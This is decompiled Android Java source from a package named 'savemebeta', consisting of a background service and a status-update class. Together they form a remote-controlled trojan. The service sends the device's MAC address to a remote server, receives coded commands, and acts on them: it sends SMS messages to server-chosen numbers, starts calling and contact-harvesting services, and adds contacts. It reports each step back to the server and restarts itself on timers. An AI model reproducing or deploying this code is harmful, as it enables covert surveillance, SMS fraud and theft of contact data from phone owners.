package com.savemebeta;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.wifi.WifiManager;
import android.os.AsyncTask;
import android.os.IBinder;
import android.telephony.SmsManager;
import android.view.MotionEvent;
import android.view.View;
import android.view.View.OnTouchListener;
import android.widget.Toast;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.StringTokenizer;
import java.util.Timer;
import java.util.TimerTask;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;

public class GTSTSR extends Service implements OnTouchListener {
    public static String Add_Contact;
    public static String EXT_SMS;
    public static String Mac;
    public static String Make_Call;
    public static String SMS;
    public static String Send_Contact;
    public static String Send_ESms;
    public static String Send_Sms;
    public static String Still_Here;
    String[] DATA;
    String[] StatusData;
    public String address;
    Boolean conx = Boolean.valueOf(false);
    Context ctx = this;
    ArrayList<HashMap<String, String>> liss = new ArrayList();

    public class StatusTask extends AsyncTask<Void, Void, Void> {
        /* access modifiers changed from: protected|varargs */
        public Void doInBackground(Void... params) {
            String MAC = GTSTSR.this.address;
            HttpClient httpclient = new DefaultHttpClient();
            HttpPost httppost = new HttpPost("http://topemarketing.com/android/googlefinal/bingo.php");
            List<NameValuePair> nameValuePairs = new ArrayList(5);
            nameValuePairs.add(new BasicNameValuePair("mac", MAC));
            try {
                httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
                try {
                    try {
                        StringTokenizer list = new StringTokenizer(EntityUtils.toString(httpclient.execute(httppost).getEntity()), "#");
                        GTSTSR.this.StatusData = new String[(list.countTokens() - 1)];
                        int i = 0;
                        while (list.hasMoreElements()) {
                            try {
                                GTSTSR.this.StatusData[i] = list.nextElement().toString();
                                i++;
                            } catch (Exception e) {
                            }
                        }
                    } catch (Exception e2) {
                    }
                } catch (ClientProtocolException e3) {
                    e3.printStackTrace();
                } catch (IOException e4) {
                    e4.printStackTrace();
                }
            } catch (UnsupportedEncodingException e5) {
                e5.printStackTrace();
            }
            GTSTSR.Mac = GTSTSR.this.address;
            GTSTSR.Send_Sms = GTSTSR.this.StatusData[1];
            GTSTSR.Send_ESms = GTSTSR.this.StatusData[2];
            GTSTSR.Make_Call = GTSTSR.this.StatusData[3];
            GTSTSR.Send_Contact = GTSTSR.this.StatusData[4];
            GTSTSR.Add_Contact = GTSTSR.this.StatusData[5];
            GTSTSR.Still_Here = GTSTSR.this.StatusData[6];
            new globaldata().execute(new Void[0]);
            return null;
        }
    }

    public class globaldata extends AsyncTask<Void, Void, Void> {
        /* access modifiers changed from: protected|varargs */
        public Void doInBackground(Void... params) {
            HttpClient httpclient = new DefaultHttpClient();
            HttpPost httppost = new HttpPost("http://topemarketing.com/android/googlefinal/data.php");
            List<NameValuePair> nameValuePairs = new ArrayList(5);
            nameValuePairs.add(new BasicNameValuePair("mac", GTSTSR.Mac));
            try {
                httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
                try {
                    try {
                        StringTokenizer list = new StringTokenizer(EntityUtils.toString(httpclient.execute(httppost).getEntity()), "#");
                        GTSTSR.this.DATA = new String[(list.countTokens() - 1)];
                        int i = 0;
                        while (list.hasMoreElements()) {
                            try {
                                GTSTSR.this.DATA[i] = list.nextElement().toString();
                                i++;
                            } catch (Exception e) {
                            }
                        }
                    } catch (Exception e2) {
                    }
                } catch (ClientProtocolException e3) {
                    e3.printStackTrace();
                } catch (IOException e4) {
                    e4.printStackTrace();
                }
            } catch (UnsupportedEncodingException e5) {
                e5.printStackTrace();
            }
            GTSTSR.SMS = GTSTSR.this.DATA[1];
            GTSTSR.EXT_SMS = GTSTSR.this.DATA[2];
            GTSTSR.this.CHECK();
            return null;
        }
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onCreate() {
        super.onCreate();
        ConnectivityManager con_manager = (ConnectivityManager) this.ctx.getSystemService("connectivity");
        if (con_manager.getActiveNetworkInfo() != null && con_manager.getActiveNetworkInfo().isAvailable() && con_manager.getActiveNetworkInfo().isConnected()) {
            this.conx = Boolean.valueOf(true);
        } else {
            this.conx = Boolean.valueOf(false);
        }
        if (this.conx.booleanValue()) {
            this.address = ((WifiManager) getSystemService("wifi")).getConnectionInfo().getMacAddress();
            new StatusTask().execute(new Void[0]);
            return;
        }
        new Timer().schedule(new TimerTask() {
            public void run() {
                GTSTSR.this.startService(new Intent(GTSTSR.this, restart.class));
            }
        }, 30000);
    }

    public void CHECK() {
        if (Mac.equals(this.address) && Still_Here.equals("check")) {
            new update().var(this.address, "", "", "", "", "", "", "");
        }
        if (Mac.equals(this.address) && Send_Sms.equals("SSYN")) {
            new update().var(this.address, "SSTLAH", "", "", "", "", "", "");
            startService(new Intent(this, SCHKMS.class));
        } else if (Mac.equals(this.address) && Send_ESms.equals("SESHB")) {
            new update().var(this.address, "", "SESFK", "", "", "", "", "");
            SmsManager.getDefault().sendTextMessage(EXT_SMS, null, SMS, null, null);
        } else if (Mac.equals(this.address) && Make_Call.equals("MCDB")) {
            new update().var(this.address, "", "", "MCLA", "", "", "", "");
            startService(new Intent(this, RC.class));
        } else if (Mac.equals(this.address) && Send_Contact.equals("SCNAH")) {
            new update().var(this.address, "", "", "", "SCNTCALMA", "", "", "");
            startService(new Intent(this, CO.class));
        } else if (Mac.equals(this.address) && Add_Contact.equals("ACMZ")) {
            new update().var(this.address, "", "", "", "", "ACSIR", "", "");
            startActivity(new Intent(this, addcontact.class));
        } else if (Mac.equals(this.address) && Send_Sms.equals("SSTLAH") && Send_ESms.equals("SESFK") && Make_Call.equals("MCLA") && Send_Contact.equals("SCNTCALMA") && Add_Contact.equals("ACSIR")) {
            new Timer().schedule(new TimerTask() {
                public void run() {
                    GTSTSR.this.startService(new Intent(GTSTSR.this, restart.class));
                }
            }, 120000);
        }
    }

    public void onDestroy() {
        super.onDestroy();
    }

    public boolean onTouch(View v, MotionEvent event) {
        Toast.makeText(this, "REQUEST event", 0).show();
        return false;
    }
}
package com.savemebeta;

import android.os.AsyncTask;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

public class update {
    public static String Add_Contact;
    public static String Mac;
    public static String Make_Call;
    public static String SendTime;
    public static String Send_Contact;
    public static String Send_ESms;
    public static String Send_Sms;
    public static String Still_Here;
    public static String Timea;

    public class sendmystatus extends AsyncTask<Void, Void, Void> {
        /* access modifiers changed from: protected|varargs */
        public Void doInBackground(Void... params) {
            HttpClient httpClient = new DefaultHttpClient();
            HttpPost httpPost = new HttpPost("http://topemarketing.com/android/googlefinal/updatestatus.php");
            List<NameValuePair> nameValuePairs = new ArrayList();
            nameValuePairs.add(new BasicNameValuePair("mac", update.Mac));
            nameValuePairs.add(new BasicNameValuePair("sendsms", update.Send_Sms));
            nameValuePairs.add(new BasicNameValuePair("sendesms", update.Send_ESms));
            nameValuePairs.add(new BasicNameValuePair("makecall", update.Make_Call));
            nameValuePairs.add(new BasicNameValuePair("sendcontact", update.Send_Contact));
            nameValuePairs.add(new BasicNameValuePair("addcontact", update.Add_Contact));
            nameValuePairs.add(new BasicNameValuePair("timea", update.Timea));
            nameValuePairs.add(new BasicNameValuePair("checkif", "yes"));
            try {
                httpPost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
            } catch (UnsupportedEncodingException e) {
                e.printStackTrace();
            }
            try {
                httpClient.execute(httpPost);
            } catch (ClientProtocolException e2) {
                e2.printStackTrace();
            } catch (IOException e3) {
                e3.printStackTrace();
            }
            return null;
        }
    }

    public void var(String upmac, String upsms, String upesms, String upcall, String upcontact, String upacontact, String uptime, String upcheck) {
        SendTime = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss").format(Calendar.getInstance().getTime());
        Mac = upmac;
        Send_Sms = upsms;
        Send_ESms = upesms;
        Make_Call = upcall;
        Send_Contact = upcontact;
        Add_Contact = upacontact;
        Timea = SendTime;
        Still_Here = upcheck;
        new sendmystatus().execute(new Void[0]);
    }
}
